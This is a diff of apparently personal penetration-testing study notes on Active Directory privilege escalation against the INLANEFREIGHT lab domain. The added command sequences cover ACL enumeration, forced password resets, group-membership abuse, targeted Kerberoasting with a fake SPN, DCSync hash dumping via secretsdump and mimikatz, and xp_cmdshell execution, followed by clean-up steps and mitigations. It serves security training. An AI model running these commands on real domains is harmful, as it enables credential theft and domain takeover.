@@ -4,10 +4,9 @@ author: amandaguglieri
 draft: false
 TableOfContents: true
 tags:
-  - active
-  - directory
+  - active directory
   - ldap
-  - linux
+  - windows
 ---
 # Privilege escalation in Active Directory from Windows
 
@@ -228,6 +227,7 @@ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
 > In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. 
 
 
+
 #### Mitigating Kerberoasting
 
 Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools.
@@ -265,7 +265,9 @@ We can use ACL attacks for:
 - Privilege escalation
 - Persistence
 
-### Enumerating ACLs with PowerView
+### Enumerating ACLs 
+
+#### PowerView
 
 ```powershell
 # First import PowerView module
@@ -284,9 +286,20 @@ Import-Module .\PowerView.ps1
 # Obtain the SID of the user you have control on, for instance wley, and set it to variable $sid
 $sid = Convert-NameToSid wley
 
-#  find all domain objects that our user has rights over 
+#  Find all domain objects that our user has rights over 
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
 # -ResolveGUIDs: PowerView flag that will return the ObjectAceType property in a readable way and not as a GUID value that is not human readable.
+
+# Lists of objects which you have Force-Change-Password right over. First, get your current user’s sid by executing `whoami /user`, import powerview, then execute the below command to get the list of objects on which you have _Force-Change-Password_.
+get-objectacl -resolveguids | ? {($_.securityidentifier -eq "[your_current_user_sid]") -and ($_.objectacetype -eq "User-Force-Change-Password")}
+
+# Examine the rights that a user has over a group
+$sid = Convert-NameToSid $userSamAccountName
+Get-DomainObjectACL -Identity "$groupName" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
+
+# Examine the rights that a user has over another user
+$sid = Convert-NameToSid $user1SamAccountName
+Get-DomainObjectACL -Identity "$user2SamAccountName" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
 ```
 
 Result:
@@ -314,30 +327,7 @@ OpaqueLength           : 0
 
 The ObjectAceType `User-Force-Change-Password` means that we have the right to modify `Dana Amundsen`'s password.
 
-Without the PowerView flag `-ResolveGUIDs`, we would get `ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529`.
-
-```powershell
-ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
-ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceFlags         : ObjectAceTypePresent
-ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
-InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
-BinaryLength           : 56
-AceQualifier           : AccessAllowed
-IsCallback             : False
-OpaqueLength           : 0
-AccessMask             : 256
-SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
-AceType                : AccessAllowedObject
-AceFlags               : ContainerInherit
-IsInherited            : False
-InheritanceFlags       : ContainerInherit
-PropagationFlags       : None
-AuditFlags             : None
-```
-
-Notice that now the ObjectAceType  is set to a GUID: `00299570-246d-11d0-a768-00aa006e0529` . We can google and get to [this microsoft page](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password).  We can also perform a Reverse Search & Map to a GUID Value:
+Without the PowerView flag `-ResolveGUIDs`, we would get `ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529`, the GUID. We can google and get to [this microsoft page](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password).  We can also perform a Reverse Search & Map to a GUID Value:
 
 ```powershell
 $guid= "00299570-246d-11d0-a768-00aa006e0529"
@@ -346,7 +336,7 @@ Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNami
 ```
 
 
-### Enumerating ACLs with Powershell
+#### Powershell
 
 ```powershell
 # Create a List of Domain Users
@@ -362,7 +352,7 @@ Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNami
 
 ```
 
-### Enumerating ACLs with Bloodhound
+#### Bloodhound
 
 See [bloodhound](bloodhound.md).
 
@@ -372,19 +362,26 @@ Steps:
 2. Set a user  as the starting node, select the `Node Info` tab and scroll down to `Outbound Control Rights`.  
 3. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under `Transitive Object Control`.
 
-IBy right-clicking on the line between  two objects, a menu will pop up.
+By right-clicking on the line between  two objects, a menu will pop up.
+
+
 
 ### ForceChangePassword
 
+
+![](img/dacl01.png)
+
 This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the target user.
 
-
+#### Change password (plaintext)
 The attacker can change the password of the user. This can be achieved with [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).
 
 ```powershell
 $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force 
 
-Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
+Set-DomainUserPassword -Identity $TargetUser -AccountPassword $NewPassword
+
+runas /$TargetUser:[domain\$TargetUser] cmd.exe
 ```
 
 We can also use mimikatz:
@@ -392,6 +389,25 @@ We can also use mimikatz:
 ```powershell
 lsadump::setntlm
 ```
+
+#### Change password using SecureString Object
+
+```powershell
+# Wley will change the password of damundsen. First, open Powershell as Wley
+# Creating a PSCredential Object
+$SecPassword = ConvertTo-SecureString '$wleyPassword' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
+
+# Creating a SecureString Object
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+# Changing the User's Password
+cd C:\Tools\
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+```
+
+Note: The **`SecureString` object** (`$SecPassword`) is associated with the **user `wley`** because it is used to create a **`PSCredential` object**, which represents a specific user's credentials. These credentials are used afterwards with the  `Set-DomainUserPassword` command, whereas the `-Credential` parameter ensures that all actions taken within that cmdlet use the privileges of the `wley` account.
 
 ###  AddMember
 
@@ -426,7 +442,11 @@ AceQualifier          : AccessAllowed
 ```
 
 #### GenericWrite
-Our user damundsen has GenericWrite privileges over the Help Desk Level 1 group. This means, among other things, that the attacker can add a user/group/computer to a group.
+
+
+![](img/dacl.png)
+
+Our user damundsen has GenericWrite privileges over the `Help Desk Level 1` group. This means, among other things, that the attacker can add a user/group/computer to a group.
 
 === "Linux"
 
@@ -445,17 +465,34 @@ Our user damundsen has GenericWrite privileges over the Help Desk Level 1 group.
 
     ```powershell
     # Command line
-	net group 'Help Desk Level 1' 'user' /add /domain 
+	net group 'Help Desk Level 1' $user /add /domain 
 	
 	# Powershell: Active Directory module 
-	Add-ADGroupMember -Identity 'Help Desk Level 1' -Members 'user' 
+	Add-ADGroupMember -Identity 'Help Desk Level 1' -Members $user
 	
 	# Powershell: PowerSploit module 
-	Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'user'
+	Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members $user
     ```
+
+=== "Windows with SecureString"
+
+	```powershell
+	# Creating a SecureString Object using damundsen
+	$SecPassword = ConvertTo-SecureString '$damundsenPassword' -AsPlainText -Force
+	$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+		
+	# Add damundsen to the group
+	Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+		
+	# Confirming damundsen was Added to the Group
+	Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
 
 
 #### GenericAll
+
+![](img/dacl.png)
+
 Investigating the Help Desk Level 1 Group with Get-DomainGroup: 
 
 ```powershell
@@ -501,58 +538,263 @@ Members of the `Information Technology` group have `GenericAll` rights over 
 - Force change a password
 - Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak
 
-Looking for Interesting Access for the adunn user: 
+Let's do a kerberoasting attack:
 
 ```powershell
-$adunnsid = Convert-NameToSid adunn 
+# Creating a SecureString Object using damundsen
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
 
-Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+# Creating a Fake SPN
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+#  Kerberoasting with Rubeus
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+# Crack it
+hashcat -m 13100 $filename /usr/share/wordlists/rockyou.txt
 ```
 
-Results: 
-```powershell 
-AceQualifier           : AccessAllowed
-ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
-ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
-InheritanceFlags       : ContainerInherit
-BinaryLength           : 56
-AceType                : AccessAllowedObject
-ObjectAceFlags         : ObjectAceTypePresent
-IsCallback             : False
-PropagationFlags       : None
-SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
-AccessMask             : 256
-AuditFlags             : None
-IsInherited            : False
-AceFlags               : ContainerInherit
-InheritedObjectAceType : All
-OpaqueLength           : 0
 
-AceQualifier           : AccessAllowed
-ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : DS-Replication-Get-Changes
-ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
-InheritanceFlags       : ContainerInherit
-BinaryLength           : 56
-AceType                : AccessAllowedObject
-ObjectAceFlags         : ObjectAceTypePresent
-IsCallback             : False
-PropagationFlags       : None
-SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
-AccessMask             : 256
-AuditFlags             : None
-IsInherited            : False
-AceFlags               : ContainerInherit
-InheritedObjectAceType : All
-OpaqueLength           : 0
+Clean up:
+
+```powershell
+# 1. Removing the Fake SPN from adunn's Account
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+# 2. Remove the damundsen user from the Help Desk Level 1 group
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+# Confirming damundsen was Removed from the Group
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
 ```
 
-The output above shows that our `adunn` user has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the `DCSync` section.
+### DCSync
+
+DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+
+The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.
+
+To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
+
+**1.** Use Get-DomainUser to View the users's Group Membership:
+
+```powershell
+Get-DomainUser -Identity $userSamAccountName  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+```
+
+**2.** Check if the user has replication rights:
+
+```powershell
+# we obtained the sid from previous command
+$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+```
+
+DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.
 
 
+####  Linux:  Impacket’s secretsdump.py
+
+```bash
+secretsdump.py -outputfile $filename -just-dc $domain/$userSamAccountName@$ipDomainController
+# As an example:
+# secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+# -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+# -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+# just-dc-user <USERNAME> to only extract data for a specific user
+# -pwd-last-set to see when each account's password was last changed
+# -history if we want to dump password history
+# -user-status flag to check and see if a user is disabled. 
+
+# This will generate 3 files with dumped secrets
+```
+
+
+#### Reversible Encryption Password Storage Set
+
+![](img/reversible.png)
+
+When this option is set on a user account, the passwords are stored using RC4 encryption, the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent.
+
+Enumerate accounts with reversible Encryption Password Storage Set with Active Directive cmdlet:
+
+```powershell
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+```
+
+Enumerate accounts with reversible Encryption Password Storage Set with PowerView:
+
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
+
+To decrypt it we can use Impacket’s secretsdump.py:
+
+```bash
+secretsdump.py -outputfile $filename -just-dc $domain/$userSamAccountName@$ipDomainController
+# As an example:
+# secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+```
+
+#### Mimikatz
+
+Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:
+
+```cmd-session
+runas /netonly /user:$domain\$userSamAccountName powershell
+# Example:
+# runas /netonly /user:INLANEFREIGHT\adunn powershell
+```
+
+And now, from powershell:
+
+```powershell
+
+.\mimikatz.exe
+
+#########
+# mimikatz command
+########
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
+```
+
+## ⛔ Privileged Access
+
+Sometimes we don't  have local admin rights on any hosts in the domain. However there are other ways to access the host:
+
+- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
+    
+- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as [PSRemoting or Windows Remote Management (WinRM) access](5985-5986-winrm-windows-remote-management.md), is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
+    
+- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. 
+
+Via BloodHound we can enumerate the following edges to see what types of remote access privileges a given user has:
+
+- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
+- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
+- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)
+
+### Remote Desktop
+
+Enumerating the Remote Desktop Users Group with PowerView.ps1.
+
+```powershell
+Import-Module .\PowerView.ps1
+
+# Enumerate members accessing current machine
+Get-NetLocalGroupMember -GroupName "Remote Desktop Users"
+
+# Enumerate members accessing a given host
+Get-NetLocalGroupMember -ComputerName $HostName -GroupName "Remote Desktop Users"
+# Example:
+# Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+```
+
+From Bloodhound, we can check the Analysis tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`.
+
+Test access with
+Linux: xfreerdp, rdesktop, Remmina 
+Windows:  mstsc.exe.
+
+### WinRM
+
+Enumerating the Remote Management Users Group with PowerView.ps1.
+
+```powershell
+Import-Module .\PowerView.ps1
+
+# Enumerate members accessing current machine
+Get-NetLocalGroupMember -GroupName "Remote Management Users"
+
+# Enumerate members accessing a given host
+Get-NetLocalGroupMember -ComputerName $HostName -GroupName "Remote Management Users"
+# Example:
+# Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+```
+
+In Bloodhound, we can use this Cypher query and add it as a custom query:
+
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+To access from Linux, use [evil-winrm](evil-winrm.md).
+
+```bash
+evil-winrm -i $ip -u <username -p <password>
+
+evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
+# -H: Hash
+```
+
+To access from Windows, use Powershell and the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet:
+
+```powershell
+# Create a SecureString object_
+$password = ConvertTo-SecureString "$passwordOfUser" -AsPlainText -Force
+$cred = new-object System.Management.Automation.PSCredential ("$domain\$userSamAccountName", $password)
+
+# Access the host
+Enter-PSSession -ComputerName $hostName -Credential $cred
+
+#####
+# Example:
+# $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+# $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+# Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+```
+
+
+### SQL Server Admin
+
+ Enumerate via Bloodhound and the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:
+
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+
+Enumerating MSSQL Instances with [PowerUpSQL](powerupsql.md). The command needs to be ran by an user with `SQLAdmin` rights: 
+
+```powershell
+cd C:\Tools\PowerUpSQL\
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+```
+
+ Authenticate against the remote SQL server host and run custom queries or operating system commands.
+
+```powershell
+Get-SQLQuery -Verbose -Instance "$ipHost,$port" -username "$domain\$userSamAccountName" -password "$password" -query 'Select @@version'
+
+# Example:
+# Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+```
+ 
+We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.
+
+```bash
+mssqlclient.py $domain/$user@$ip -windows-auth
+# Example:
+# mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+```
+
+We could then choose `enable_xp_cmdshell` to enable the [xp_cmdshell stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
+
+```bash
+SQL> enable_xp_cmdshell
+```
+
+Finally, we can run commands in the format `xp_cmdshell <command>`.
+
+```bash
+xp_cmdshell whoami /priv
+```
+
+>Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal.
+>
 
 ## Evasion Techniques
 
@@ -575,4 +817,26 @@ Typing `net1` instead of `net` will execute the same functions without the p
 
 ```powershell
 net1 user /domain	
+```
+
+
+## Mitigations
+
+1. `Auditing for and removing dangerous ACLs`
+
+Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.
+
+2. `Monitor group membership`
+
+Visibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain.
+
+3. `Audit and monitor for ACL changes`
+
+Enabling the [Advanced Security Audit Policy](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access) can help in detecting unwanted changes, especially [Event ID 5136: A directory service object was modified](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136) which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID `5136` created. If we check out the `Details` tab, we can see that the pertinent information is written in [Security Descriptor Definition Language (SDDL)](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) which is not human readable.
+
+We can use the [ConvertFrom-SddlString cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) to convert this to a readable format.
+
+```powershell
+# Converting the SDDL String into a Readable Format
+ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-[CUT]" 
 ```
